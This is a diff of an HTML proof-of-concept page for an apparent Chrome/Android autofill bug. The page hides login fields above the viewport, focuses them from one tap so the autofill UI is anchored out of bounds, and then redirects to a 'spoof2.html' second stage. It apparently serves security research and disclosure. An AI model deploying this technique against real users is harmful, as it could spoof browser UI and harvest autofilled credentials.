@@ -1,36 +1,34 @@
+```html
 <!DOCTYPE html>
 <html>
 <head>
   <meta name="viewport"
         content="width=device-width, initial-scale=1.0, user-scalable=no">
 
-  <title>Chrome Bottom Address-Bar Overlap PoC</title>
+  <title>Android Autofill FillUi out-of-bounds anchor</title>
 
   <style>
     html,
     body {
       margin: 0;
       padding: 0;
-      width: 100%;
       height: 100%;
       overflow: hidden;
     }
 
     /*
-     * The autofill target is deliberately positioned above
-     * the WebView viewport.
+     * Autofill target positioned above the viewport.
      *
-     * This causes the renderer-side bounds for the field to
-     * contain a negative Y coordinate.
+     * The purpose of this PoC is to test whether the negative
+     * viewport/widget coordinate is propagated into the Android
+     * Autofill UI anchor instead of being clamped.
      */
     #u {
       position: fixed;
       top: -120px;
       left: 0;
-
       width: 300px;
       height: 40px;
-
       font-size: 16px;
     }
 
@@ -38,258 +36,124 @@
       position: fixed;
       top: -200px;
       left: 0;
-
       width: 300px;
       height: 40px;
-
       font-size: 16px;
     }
 
     /*
-     * Single user-activation surface.
+     * Visible activation surface.
      */
     #tap {
       position: fixed;
-
       top: 40px;
       left: 20px;
       right: 20px;
 
-      height: 56px;
-      line-height: 56px;
+      padding: 18px;
 
       background: #1a73e8;
-      color: white;
+      color: #fff;
 
       font: 18px sans-serif;
-      line-height: 56px;
       text-align: center;
 
       border-radius: 6px;
+      cursor: pointer;
 
       user-select: none;
       -webkit-user-select: none;
-
-      touch-action: manipulation;
-
-      box-sizing: border-box;
-    }
-
-    #status {
-      position: fixed;
-
-      top: 115px;
-      left: 20px;
-      right: 20px;
-
-      font: 14px sans-serif;
-      line-height: 20px;
     }
 
     #log {
       position: fixed;
-
-      top: 180px;
+      top: 120px;
       left: 20px;
       right: 20px;
 
       font: 12px monospace;
-      line-height: 18px;
-
       white-space: pre-wrap;
-      overflow-wrap: break-word;
     }
   </style>
 </head>
 
 <body>
 
-<form action="c/login" method="post" id="f">
+  <form action="/login" method="post" id="f">
 
-  <!-- Deliberately outside the visible viewport. -->
-  <input
-    id="u"
-    name="username"
-    type="text"
-    autocomplete="username">
+    <input
+      id="u"
+      name="username"
+      type="text"
+      autocomplete="username">
 
-  <input
-    id="p"
-    name="password"
-    type="password"
-    autocomplete="current-password">
+    <input
+      id="p"
+      name="password"
+      type="password"
+      autocomplete="current-password">
 
-</form>
+  </form>
 
-<!--
-  Only one user interaction is required.
--->
-<div id="tap">Tap once to reproduce</div>
+  <!-- Single physical tap -->
+  <label id="tap" for="u">
+    Tap to sign in
+  </label>
 
-<div id="status">
-  Ready
-</div>
+  <pre id="log"></pre>
 
-<pre id="log"></pre>
+  <script>
+    const log = message => {
+      document.getElementById('log').textContent += message + '\n';
+    };
 
-<script>
-'use strict';
+    const button = document.getElementById('tap');
+    const username = document.getElementById('u');
 
-const tap = document.getElementById('tap');
-const username = document.getElementById('u');
-const status = document.getElementById('status');
-const logElement = document.getElementById('log');
+    button.addEventListener('click', () => {
 
-let started = false;
+      log('User activation received.');
+      log('Executing autofill focus sequence 3 times...');
 
-function log(message) {
-  logElement.textContent += message + '\n';
-}
+      /*
+       * One physical tap -> three focus attempts.
+       */
+      for (let i = 1; i <= 3; i++) {
 
-function reportViewport() {
-  const rect = username.getBoundingClientRect();
+        username.focus({
+          preventScroll: true
+        });
 
-  log(
-    'field rect: ' +
-    'x=' + rect.x +
-    ' y=' + rect.y +
-    ' w=' + rect.width +
-    ' h=' + rect.height
-  );
+        const rect = username.getBoundingClientRect();
 
-  log(
-    'window.innerHeight=' +
-    window.innerHeight
-  );
+        log(
+          'Attempt #' + i +
+          ': y=' + rect.top +
+          ' h=' + rect.height
+        );
 
-  if (window.visualViewport) {
-    log(
-      'visualViewport: ' +
-      'height=' + window.visualViewport.height +
-      ' offsetTop=' + window.visualViewport.offsetTop +
-      ' scale=' + window.visualViewport.scale
-    );
-  }
-}
+        log(
+          'Viewport=' +
+          window.innerWidth +
+          'x' +
+          window.innerHeight
+        );
+      }
 
-tap.addEventListener('click', () => {
-  if (started)
-    return;
+      log('');
+      log('Completed 3 focus attempts from one physical tap.');
+      log('Expected target Y coordinate: negative.');
 
-  started = true;
-
-  tap.textContent = 'Reproduction running...';
-  status.textContent = 'Triggering autofill...';
-
-  log('=== START ===');
-  log('Single user gesture received');
-
-  /*
-   * The important trigger:
-   *
-   * Focus an autofill field that is positioned above the
-   * visible WebView viewport without allowing the browser
-   * to scroll it into view.
-   */
-  username.focus({
-    preventScroll: true
-  });
-
-  log('Focused off-viewport username field');
-
-  reportViewport();
-
-  /*
-   * Give Chrome/Android time to present the keyboard and
-   * autofill UI and to perform its viewport/layout updates.
-   */
-  setTimeout(() => {
-    status.textContent = 'Waiting for browser UI to settle...';
-
-    log('');
-    log('--- after 750 ms ---');
-
-    reportViewport();
-
-  }, 750);
-
-  /*
-   * Re-check after the keyboard/autofill UI has had time
-   * to settle.
-   *
-   * This is intentionally NOT another user interaction.
-   */
-  setTimeout(() => {
-    status.textContent = 'Autofill/browser UI state established';
-
-    log('');
-    log('--- after 2000 ms ---');
-
-    reportViewport();
-
-  }, 2000);
-
-  /*
-   * Preserve the delay used by the original PoC before
-   * transitioning to the second page.
-   */
-  setTimeout(() => {
-    status.textContent = 'Loading second-stage page...';
-
-    log('');
-    log('--- after 6000 ms ---');
-    log('Navigating to spoof2.html');
-
-    window.location.href = 'spoof2.html';
-
-  }, 6000);
-});
-
-
-/*
- * Useful diagnostics while the keyboard changes the
- * visual viewport.
- */
-if (window.visualViewport) {
-
-  window.visualViewport.addEventListener('resize', () => {
-    log('');
-    log('[visualViewport resize]');
-
-    reportViewport();
-  });
-
-  window.visualViewport.addEventListener('scroll', () => {
-    log('');
-    log('[visualViewport scroll]');
-
-    reportViewport();
-  });
-}
-
-
-/*
- * Log regular window resize events as well.
- */
-window.addEventListener('resize', () => {
-  log('');
-  log('[window resize]');
-
-  reportViewport();
-});
-
-
-/*
- * Variant:
- *
- * To investigate the opposite direction (content positioned
- * below the WebView and overlapping bottom embedder UI),
- * uncomment:
- *
- * username.style.top = (window.innerHeight + 80) + 'px';
- */
-
-</script>
+      /*
+       * Allow time for the Autofill UI to become visible.
+       */
+      setTimeout(() => {
+        log('Navigating to spoof2.html...');
+        document.location = 'spoof2.html';
+      }, 6000);
+    });
+  </script>
 
 </body>
 </html>
+```
